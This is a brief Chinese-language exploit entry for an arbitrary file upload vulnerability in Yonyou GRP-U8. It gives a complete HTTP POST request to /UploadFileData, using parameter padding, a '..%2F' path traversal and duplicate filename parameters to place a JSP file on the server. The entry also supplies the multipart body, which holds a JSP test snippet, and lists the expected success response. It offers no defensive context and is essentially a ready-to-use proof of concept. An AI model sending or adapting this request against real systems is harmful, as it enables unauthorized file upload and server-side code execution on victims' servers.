# 用友-GRP-U8任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=6666888.jsp&filename=1.jpg HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=106662F4FACC6F8D06BAFF689D3B4D15`　`Content-Type: multipart/form-data`

**请求体 / payload**
```
--ec126a48c5b7676dce1b676f5251358f
Content-Disposition: form-data; name="myfile"; filename="test.jpg"
<% out.println("test");%>
--ec126a48c5b7676dce1b676f5251358f--
```
- **预期**：200　|　script